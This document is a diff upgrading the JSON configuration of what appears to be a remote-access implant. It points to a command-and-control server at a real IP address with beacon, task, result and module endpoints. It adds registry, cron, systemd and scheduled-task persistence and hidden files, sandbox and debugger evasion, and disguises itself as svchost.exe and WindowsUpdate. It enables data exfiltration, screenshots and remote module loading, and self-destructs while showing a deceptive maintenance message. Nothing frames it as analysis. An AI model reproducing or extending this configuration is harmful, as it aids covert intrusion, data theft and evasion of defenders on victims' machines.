@@ -1,50 +1,181 @@
 {
-  "version": "3.0",
+  "version": "4.0",
   "encryption": {
     "type": "AES-256-CBC",
     "key_derivation": "PBKDF2-HMAC-SHA256",
     "iterations": 100000,
     "salt_length": 16,
-    "iv_length": 16
+    "iv_length": 16,
+    "padding": "PKCS7",
+    "cipher_mode": "CBC",
+    "key_exchange": "ECDH-P256"
   },
   "obfuscation": {
     "sleep_jitter": [25, 45],
     "split_sleep": true,
     "random_cpu": true,
-    "polymorphic": false
+    "polymorphic": false,
+    "string_encoding": "base64",
+    "function_hashing": true,
+    "code_splicing": false,
+    "instruction_substitution": true,
+    "dead_code_injection": false,
+    "control_flow_flattening": true
   },
   "security": {
-    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "header_validation": true,
     "timestamp_tolerance": 300,
-    "nonce_check": true
+    "nonce_check": true,
+    "request_signing": true,
+    "mac_algo": "HMAC-SHA256",
+    "session_rotation": 86400,
+    "sandbox_evasion": true,
+    "debugger_detection": true,
+    "vm_detection": false,
+    "memory_guard": true,
+    "stack_cookie": true
   },
   "persistence": {
-    "methods": ["registry", "startup_folder", "cron", "systemd"],
-    "auto_start": true
+    "methods": ["registry", "startup_folder", "cron", "systemd", "service", "scheduled_task"],
+    "auto_start": true,
+    "registry_hidden": true,
+    "file_attributes": ["hidden", "system"],
+    "alternate_data_streams": true,
+    "process_hollowing": false,
+    "dll_injection": false,
+    "survival_time": 2592000
   },
   "logging": {
     "level": "error",
-    "remote_logging": false
+    "remote_logging": false,
+    "local_logging": false,
+    "log_compression": true,
+    "log_encryption": true,
+    "max_log_size": "10MB",
+    "log_retention": 7,
+    "sensitive_data_masking": true
   },
   "c2": {
     "primary": "http://141.105.71.196:5000",
     "fallback": [],
-    "auto_discover": false,
+    "auto_discover": true,
     "domain_fronting": false,
     "cdn_support": false,
+    "proxy_support": true,
     "connection_timeout": 30,
     "retry_attempts": 3,
-    "retry_delay": 10
+    "retry_delay": 10,
+    "jitter": 0.3,
+    "beacon_interval": 45,
+    "beacon_interval_variance": 0.2,
+    "max_beacon_size": "1MB",
+    "heartbeat_interval": 120,
+    "heartbeat_timeout": 300,
+    "idle_timeout": 900,
+    "endpoints": {
+      "beacon": "/phantom/beacon",
+      "task": "/phantom/tasks",
+      "result": "/phantom/results",
+      "modules": "/phantom/modules",
+      "config": "/phantom/config",
+      "health": "/phantom/health"
+    }
+  },
+  "performance": {
+    "max_threads": 5,
+    "io_buffer_size": 8192,
+    "max_file_chunk": "256KB",
+    "compression_level": 6,
+    "cache_size": "50MB",
+    "memory_limit": "200MB",
+    "disk_quota": "100MB",
+    "network_throttle": 102400,
+    "cpu_throttle": 50
   },
   "compatibility": {
     "os": ["windows", "linux", "macos"],
-    "arch": ["x64", "x86", "arm64"]
+    "arch": ["x64", "x86", "arm64"],
+    "python_versions": ["3.8", "3.9", "3.10", "3.11"],
+    "elevated_required": false,
+    "admin_required": false,
+    "system_requirements": {
+      "min_ram": "128MB",
+      "min_disk": "10MB",
+      "min_cpu_cores": 1
+    }
   },
   "features": {
     "heartbeat": true,
     "task_queue": true,
     "exfil_compression": true,
-    "self_destruct": true
+    "self_destruct": true,
+    "auto_update": false,
+    "module_autoload": true,
+    "dynamic_config": true,
+    "geolocation": false,
+    "screenshot": true,
+    "keylogger": false,
+    "file_operations": true,
+    "process_management": true,
+    "network_discovery": true,
+    "lateral_movement": false,
+    "credential_harvesting": false,
+    "data_exfiltration": true,
+    "data_encryption": true
+  },
+  "modules": {
+    "enabled": ["sysinfo", "fileops", "network", "process"],
+    "disabled": ["destructive", "webcam", "microphone", "ransomware"],
+    "signature_validation": true,
+    "remote_load": true,
+    "cache_timeout": 3600,
+    "max_module_size": "5MB"
+  },
+  "network": {
+    "dns_resolution": true,
+    "dns_over_https": false,
+    "ipv6_support": false,
+    "tor_support": false,
+    "proxy_auto_detect": true,
+    "protocol_versions": ["HTTP/1.1"],
+    "keep_alive": true,
+    "connection_pooling": true
+  },
+  "stealth": {
+    "process_name": "svchost.exe",
+    "service_name": "WindowsUpdate",
+    "file_name": "updatehelper.exe",
+    "use_existing_process": false,
+    "hide_network_connections": true,
+    "bypass_firewall": true,
+    "evasion_techniques": ["time_check", "process_count", "sleep_delay"],
+    "minimise_footprint": true
+  },
+  "self_destruct": {
+    "enabled": true,
+    "trigger_conditions": ["debugger_detected", "sandbox_detected", "uninstall_command", "timeout_reached"],
+    "timeout_days": 30,
+    "cleanup_method": "secure_delete",
+    "remove_traces": true,
+    "final_message": "System maintenance completed successfully"
+  },
+  "monitoring": {
+    "resource_monitor": true,
+    "anomaly_detection": true,
+    "thresholds": {
+      "cpu_max": 80,
+      "memory_max": 85,
+      "disk_max": 90,
+      "network_max": 1024000
+    },
+    "alert_conditions": ["threshold_exceeded", "unusual_behavior", "detection_event"]
+  },
+  "telemetry": {
+    "enabled": false,
+    "endpoint": "",
+    "frequency": 3600,
+    "data_points": ["performance", "errors", "security_events"],
+    "anonymize_data": true
   }
 }
